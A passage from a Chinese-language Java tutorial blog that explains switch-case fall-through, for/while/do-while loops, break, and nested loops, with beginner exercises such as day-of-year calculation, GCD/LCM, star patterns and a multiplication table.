class="string">&quot;请输入2019年的month&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> month = scan.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入2019年的day&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> day = scan.nextInt();</span><br><span class="line">        <span class="comment">//定义一个变量来保存总天数</span></span><br><span class="line">        <span class="keyword">int</span> sumDays = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(month)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>; </span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                sumDays += <span class="number">28</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                sumDays += day;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;2019年&quot;</span>+month+<span class="string">&quot;月&quot;</span>+day+<span class="string">&quot;日是当年的第&quot;</span>+sumDays+<span class="string">&quot;天&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">说明:<span class="keyword">break</span>在<span class="keyword">switch</span>- <span class="keyword">case</span>中是可选的</span><br></pre></td></tr></table></figure>

<p>从键盘分别输入年、月、日，判断这一天是当年的第几天。注:判断一年是否是闰年的标准:<br>1)可以被4整除，但不可被100整除   或者<br>2)可以被400整除</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwitchCaseTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入year&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> year = scan.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入month&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> month = scan.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入day&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> day = scan.nextInt();</span><br><span class="line">        <span class="comment">//定义一个变量来保存总天数</span></span><br><span class="line">        <span class="keyword">int</span> sumDays = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(month)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                sumDays += <span class="number">30</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>; </span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="comment">//判断year是不是闰年</span></span><br><span class="line">                <span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; year%<span class="number">100</span>!=<span class="number">0</span>) || year%<span class="number">400</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                    sumDays += <span class="number">29</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    sumDays += <span class="number">28</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                sumDays += <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                sumDays += day;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(year+<span class="string">&quot;年&quot;</span>+month+<span class="string">&quot;月&quot;</span>+day+<span class="string">&quot;日是当年的第&quot;</span>+sumDays+<span class="string">&quot;天&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>-<span class="keyword">case</span> 与 <span class="keyword">if</span>-<span class="keyword">else</span> 可以嵌套</span><br></pre></td></tr></table></figure>

<p>说明:<br>1.凡是可以使用switch-case的结构， 都可以转换为if-else。反之，不成立。<br>2.我们写分支结构时，当发现既可以使用switch-case(同时，switch中表达式的取值情况不太多)，又可以使用if-else时，我们优先选择使用switch-case.原因: switch-case执行效率稍高。</p>
<hr>
<h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><p>for循环，while循环，do-while循环</p>
<h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><p>For循环结构的使用<br>一、循环结构的4个要素<br>①初始化条件<br>②循环条件  –&gt; Boolean类型<br>③循环体<br>④迭代条件<br>二、for循环的结构<br>for(①;②;④){</p>
<p>​        ③</p>
<p>}</p>
<p>执行过程：①-&gt;②-&gt;③-&gt;④-&gt;②-&gt;③-&gt;④ -&gt;…-&gt;②</p>
<p>初始化条件在for循环内有效。出了for循环就失效了。|</p>
<p>例题：</p>
<p>编写程序从1循环到150，并在每行打印一个值，另外在每个3的倍数行<br>上打印出“foo”, 在每个5的倍数行上打印“biz”,在每个7的倍数行上打印输出“baz”。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">150</span>;i++)&#123;</span><br><span class="line">            System.out.print(i+<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;foo &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;biz &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">7</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;baz &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//换行</span></span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目:输入两个正整数m和n，求其最大公约数和最小公倍数。<br>比如: 12和20的最大公约数是4，最小公倍数是60。<br>说明:break关键字的使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入第一个正数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> m = scan.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入第二个正数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取两数中的较小值,倒着求，就能求得最大公因数。</span></span><br><span class="line">        <span class="keyword">int</span> min = (m&lt;=n)?m:n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=min;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(m % i == <span class="number">0</span> &amp;&amp; n % i == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(m+<span class="string">&quot;与&quot;</span>+n+<span class="string">&quot;的最大公因数为&quot;</span>+i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最小公倍数</span></span><br><span class="line">        <span class="keyword">int</span> max = (m&gt;=n)?m:n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=max;i&lt;=m*n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%m==<span class="number">0</span> &amp;&amp; i%n==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(m+<span class="string">&quot;与&quot;</span>+n+<span class="string">&quot;的最小公倍数为&quot;</span>+i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">①初始化条件；</span><br><span class="line"><span class="keyword">while</span>(②循环条件)&#123;</span><br><span class="line">	③循环体；</span><br><span class="line">	④迭代条件；</span><br><span class="line">&#125;</span><br><span class="line">①-&gt;②-&gt;③-&gt;④-&gt;②-&gt;③-&gt;④-&gt;...-&gt;②（<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure>

<p>实例：遍历100以内的所有偶数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhileTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明:<br>1.写while循环千万小心不要丢了迭代条件。一旦丢了，就可能导致死循环!<br>2.我们写程序，要避免出现死循环。 算法：有限性</p>
<p>3.for循环和while循环是可以相互转换的! </p>
<p>区别:for循环和while循环的初始化条件部分的作用范围不同。</p>
<h4 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">①初始化条件；</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	③循环体；</span><br><span class="line">	④迭代条件；</span><br><span class="line">	</span><br><span class="line">&#125;<span class="keyword">while</span>(②循环条件);</span><br><span class="line"></span><br><span class="line">①-&gt;③-&gt;④-&gt;②-&gt;③-&gt;④-&gt;②-&gt;③-&gt;④-&gt;...-&gt;②（<span class="keyword">false</span>)</span><br><span class="line">说明：<span class="keyword">do</span>-<span class="keyword">while</span>循环至少会执行一次循环体</span><br><span class="line">开发中，使用<span class="keyword">for</span>和<span class="keyword">while</span>更多一些，较少使用<span class="keyword">do</span>-<span class="keyword">while</span></span><br></pre></td></tr></table></figure>

<p>实例：遍历100以内的所有偶数，并计算所有偶数的和与偶数的个数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                sum += i ;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(i&lt;=<span class="number">100</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">&quot;所有偶数的和为：&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;偶数的个数为：&quot;</span>+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="while-true-结构的使用"><a href="#while-true-结构的使用" class="headerlink" title="while(true)结构的使用"></a>while(true)结构的使用</h4><p>题目:<br>从键盘读入个数不确定的整数，并判断读入的正数和负数的个数，输入为0时结束程序。</p>
<p>最简单“无限”循环格式: while(true) , for(;;),无限循环存在的原因是并不<br>知道循环多少次，需要根据循环体内部某些条件，来控制循环的结束。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForWhileTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> positiveNumber = <span class="number">0</span>; <span class="comment">//记录正数的个数</span></span><br><span class="line">        <span class="keyword">int</span> negativeNumber = <span class="number">0</span>; <span class="comment">//记录负数的个数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入数字：&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)<span class="comment">/*for(;;)*/</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> num = scan.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(num &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                negativeNumber++;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                positiveNumber++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//执行break，跳出循环</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正数的个数为：&quot;</span>+positiveNumber);</span><br><span class="line">        System.out.println(<span class="string">&quot;负数的个数为：&quot;</span>+negativeNumber);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明:<br>1.不在循环条件部分限制次数的结构: for(;;) 或while(true)<br>2.结束循环有几种方式?<br>方式一:循环条件部分返回false.<br>方式二:在循环体中,执行break.</p>
<h4 id="嵌套循环"><a href="#嵌套循环" class="headerlink" title="嵌套循环"></a>嵌套循环</h4><p>嵌套循环的使用<br>1.嵌套循环:将一个循环结构A声明在另一个循环结构B的循环体中，就构成了嵌套循环<br>2.外层循环: 循环结构B<br>   内层循环: 循环结构A</p>
<p>3.说明<br>①内层循环结构遍历一遍，只相当于外层循环循环体执行了一次<br>②假设外层循环需要执行m次，内层循环需要执行n次。此时内层循环的循环体一共执行了m * n次</p>
<p>4.技巧:<br>外层循环控制行数，内层循环控制列数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">输出四行*，每行<span class="number">6</span>个*</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForForTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">6</span>;i++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">******</span><br><span class="line">******</span><br><span class="line">******</span><br><span class="line">******</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForForTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=j;i++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForForTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">4</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>-j;i++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">****</span><br><span class="line">***</span><br><span class="line">**</span><br><span class="line">*</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForForTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//上半部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//输出“-”</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">5</span>-i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=i;k++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;* &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//下半部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">5</span>-i;k++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;* &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    * </span><br><span class="line">   * *</span><br><span class="line">  * * *</span><br><span class="line"> * * * *</span><br><span class="line">* * * * *</span><br><span class="line"> * * * *</span><br><span class="line">  * * *</span><br><span class="line">   * *</span><br><span class="line">    *</span><br></pre></td></tr></table></figure>

<p>99乘法表：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NineNineTable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">                System.out.print(j+<span class="string">&quot;*&quot;</span>+i+<span class="string">&quot;=&quot;</span>+i*j+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        